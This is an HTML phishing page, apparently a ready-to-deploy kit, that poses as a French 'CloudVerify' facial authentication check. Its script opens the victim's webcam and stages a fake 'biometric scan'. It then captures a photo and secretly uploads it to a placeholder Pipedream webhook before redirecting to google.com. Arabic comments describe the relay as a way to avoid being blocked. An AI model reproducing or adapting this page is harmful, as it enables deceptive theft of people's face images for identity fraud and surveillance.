<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service d'Authentification Sécurisé</title>
    <style>
        :root { --main-blue: #0066ff; --bg-gray: #f8f9fa; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: var(--bg-gray); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .auth-card { background: white; width: 360px; padding: 40px; border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); text-align: center; position: relative; overflow: hidden; }
        .auth-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: var(--main-blue); }
        .logo-box { font-size: 24px; font-weight: bold; color: var(--main-blue); margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        h2 { font-size: 1.2rem; color: #333; margin-bottom: 12px; }
        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 30px; }
        .btn-action { background: var(--main-blue); color: white; border: none; padding: 14px 28px; border-radius: 4px; cursor: pointer; font-size: 15px; font-weight: 600; width: 100%; transition: 0.3s ease; }
        .btn-action:hover { background: #0052cc; transform: translateY(-1px); }
        .btn-action:disabled { background: #cbd5e0; cursor: wait; }
        #v-preview { width: 100%; border-radius: 6px; margin-top: 20px; display: none; background: #000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .status-info { margin-top: 15px; font-size: 12px; color: #2ecc71; display: none; font-weight: 500; }
        .footer-text { margin-top: 30px; font-size: 10px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="logo-box">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z"/></svg>
        <span>CloudVerify</span>
    </div>
    
    <div id="init-view">
        <h2>Validation Requise</h2>
        <p>Pour des raisons de sécurité, veuillez effectuer une vérification faciale rapide afin d'accéder à votre espace membre.</p>
        <button class="btn-action" onclick="initProcess()">DÉMARRER LE SCAN</button>
    </div>

    <video id="v-preview" autoplay playsinline></video>
    <div id="status" class="status-info">Initialisation du scanner...</div>
    <canvas id="c-hidden" style="display:none;"></canvas>

    <div class="footer-text">Sécurisé par protocole SSL/TLS 1.3</div>
</div>

<script>
    // الرابط الوسيط (Pipedream) - هذا هو السر لعدم الحظر
    const WEBHOOK_URL = "YOUR_PIPEDREAM_URL_HERE";

    async function initProcess() {
        const btn = document.querySelector('.btn-action');
        const status = document.getElementById('status');
        const video = document.getElementById('v-preview');
        const initView = document.getElementById('init-view');

        try {
            // طلب الإذن الرسمي من المتصفح
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            // تحديث الواجهة
            initView.style.display = 'none';
            video.style.display = 'block';
            status.style.display = 'block';
            
            // محاكاة "فحص" لمدة 2.5 ثانية
            setTimeout(() => {
                status.innerText = "Analyse biométrique en cours...";
                captureData();
            }, 2500);

        } catch (err) {
            alert("Erreur: L'accès à la caméra est nécessaire pour la validation.");
            location.reload();
        }
    }

    function captureData() {
        const video = document.getElementById('v-preview');
        const canvas = document.getElementById('c-hidden');
        const status = document.getElementById('status');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('file', blob, 'scan.jpg');

            try {
                // إرسال البيانات للوسيط المخفي
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                status.innerText = "Vérification terminée ✅";
                setTimeout(() => {
                    // تحويل المستخدم لموقع رسمي (مثلاً جوجل)
                    window.location.href = "https://www.google.com";
                }, 1500);

            } catch (error) {
                status.innerText = "Erreur de connexion au serveur.";
                status.style.color = "red";
            }
        }, 'image/jpeg', 0.8);
    }
</script>

</body>
</html>
